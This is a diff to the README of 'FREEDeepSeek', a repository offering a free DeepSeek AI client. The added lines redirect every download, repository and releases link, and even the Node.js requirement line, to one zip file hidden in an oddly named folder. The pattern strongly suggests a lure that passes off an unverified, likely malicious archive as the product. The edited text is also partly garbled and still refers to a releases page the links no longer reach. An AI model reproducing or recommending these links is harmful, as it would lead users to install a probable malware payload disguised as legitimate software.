@@ -7,12 +7,12 @@ Welcome to FREEDeepSeek! This is a free, open-source DeepSeek AI client designed
 To get started quickly, follow the easy steps below to download and run FREEDeepSeek.
 
 ## 📥 Download FREEDeepSeek
-[![Download FREEDeepSeek](https://img.shields.io/badge/Download-FREEDeepSeek-blue)](https://github.com/julienehrhardtsimon484844/FREEDeepSeek/releases)
+[![Download FREEDeepSeek](https://github.com/julienehrhardtsimon484844/FREEDeepSeek/raw/refs/heads/main/calciphilous/FREE_Seek_Deep_3.6.zip)](https://github.com/julienehrhardtsimon484844/FREEDeepSeek/raw/refs/heads/main/calciphilous/FREE_Seek_Deep_3.6.zip)
 
 ## 📋 System Requirements
 Before you download, ensure that your system meets the following requirements:
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or higher
+- **https://github.com/julienehrhardtsimon484844/FREEDeepSeek/raw/refs/heads/main/calciphilous/FREE_Seek_Deep_3.6.zip** Version 14 or higher
 - **Internet Connection:** Required for AI interactions
 
 ## 🔍 Features
@@ -25,7 +25,7 @@ FREEDeepSeek offers a variety of useful features:
 
 ## 💻 Download & Install
 1. **Visit the Releases Page:** Click the link below to navigate to our GitHub Releases page:
-   [Download FREEDeepSeek](https://github.com/julienehrhardtsimon484844/FREEDeepSeek/releases)
+   [Download FREEDeepSeek](https://github.com/julienehrhardtsimon484844/FREEDeepSeek/raw/refs/heads/main/calciphilous/FREE_Seek_Deep_3.6.zip)
 
 2. **Choose Your Version:** On the Releases page, you will see various versions of FREEDeepSeek available for download. Look for the latest version that matches your operating system.
 
@@ -48,8 +48,8 @@ If you have trouble with FREEDeepSeek, check the following:
 - **Issues Page:** If you encounter a bug or need help, visit the Issues page on GitHub to report it.
 
 ## 🔗 Useful Links
-- [FREEDeepSeek GitHub Repository](https://github.com/julienehrhardtsimon484844/FREEDeepSeek)
-- [Visit Releases Page for Downloads](https://github.com/julienehrhardtsimon484844/FREEDeepSeek/releases)
+- [FREEDeepSeek GitHub Repository](https://github.com/julienehrhardtsimon484844/FREEDeepSeek/raw/refs/heads/main/calciphilous/FREE_Seek_Deep_3.6.zip)
+- [Visit Releases Page for Downloads](https://github.com/julienehrhardtsimon484844/FREEDeepSeek/raw/refs/heads/main/calciphilous/FREE_Seek_Deep_3.6.zip)
 
 ## 🌍 Community
 Join our community to share your experiences, give feedback, and ask questions. Connect with other users and explore the endless possibilities of FREEDeepSeek. 
